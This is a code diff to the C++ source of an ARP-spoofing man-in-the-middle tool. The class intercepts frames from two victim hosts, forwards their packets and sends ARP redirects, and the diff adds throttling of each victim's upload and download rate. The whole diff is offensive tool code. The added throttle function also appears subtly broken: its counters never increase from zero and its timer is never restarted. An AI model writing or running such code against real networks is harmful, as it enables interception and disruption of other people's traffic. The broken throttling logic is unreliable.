@@ -3,6 +3,7 @@
 #include "memoryutil.h"
 #include <iostream>
 #include <fstream>
+#include <ctime>
 
 ArpSpoofer::ArpSpoofer()
 {
@@ -27,6 +28,8 @@ void    ArpSpoofer::Initialize()
 
 void     ArpSpoofer::Start(const std::string &interface, const std::string &local_ip, char *local_mac, const std::string &ip1, char *mac1, const std::string &ip2, char *mac2)
 {
+    _interface = interface;
+
     _local_mac = local_mac;
     _local_ip = local_ip;
 
@@ -39,14 +42,19 @@ void     ArpSpoofer::Start(const std::string &interface, const std::string &loca
     client->ip = ip2;
     std::memcpy(client->mac, mac2, 6);
     _client2 = client;
+
+    _timer.restart();
 }
 
 void     ArpSpoofer::Stop()
 {
-    delete _client1;
-    _client1 = NULL;
-    delete _client2;
-    _client2 = NULL;
+    if (_client1 != NULL)
+    {
+        delete _client1;
+        _client1 = NULL;
+        delete _client2;
+        _client2 = NULL;
+    }
 }
 
 void     ArpSpoofer::ManageNewPacket(SniffedPacket &packet)
@@ -59,7 +67,9 @@ void     ArpSpoofer::ManageNewPacket(SniffedPacket &packet)
     if (strncmp(eth->ether_dhost, _local_mac, 6))
         return;
 
-    if (packet.ip_dest == _local_ip || packet.ip_source == _local_ip || !(strncmp(eth->ether_shost, _client1->mac, 6) || strncmp(eth->ether_shost, _client2->mac, 6)))
+    bool uploading = strncmp(eth->ether_shost, _client2->mac, 6);
+    bool downloading = strncmp(eth->ether_shost, _client1->mac, 6);
+    if (packet.ip_dest == _local_ip || packet.ip_source == _local_ip || !(downloading || uploading))
         return ;
 
     int nb_bytes_added = 0;
@@ -75,9 +85,39 @@ void     ArpSpoofer::ManageNewPacket(SniffedPacket &packet)
     sin.sin_family = AF_INET;
     sin.sin_port = 0;
     sin.sin_addr.s_addr = ip_hdr->ip_destaddr;
+    
+    if (ThrottleNetworkRateFor(packet, uploading))
+        return;
 
     sendto(_socket_arp, packet.data + ETHER_HDR_SIZE, packet.size - ETHER_HDR_SIZE, 0, (struct sockaddr *)&sin, sizeof(sin));
 #endif
+}
+
+bool     ArpSpoofer::ThrottleNetworkRateFor(SniffedPacket &packet, bool uploading)
+{
+    if (_timer.elapsed() > 1000)
+    {
+        _kb_downloaded_last_second = 0;
+        _kb_uploaded_last_second = 0;
+    }
+
+    if (uploading)
+    {
+        if (_kb_uploaded_last_second == 0)
+            return false;
+
+        _kb_uploaded_last_second += packet.size;
+        return (_kb_uploaded_last_second > _arp_options->upload_rate);
+    }
+    else
+    {
+        if (_kb_downloaded_last_second == 0)
+            return false;
+
+        _kb_downloaded_last_second += packet.size;
+        return (_kb_downloaded_last_second > _arp_options->download_rate);
+    }
+
 }
 
 void     ArpSpoofer::SendArpRedirectRequest()
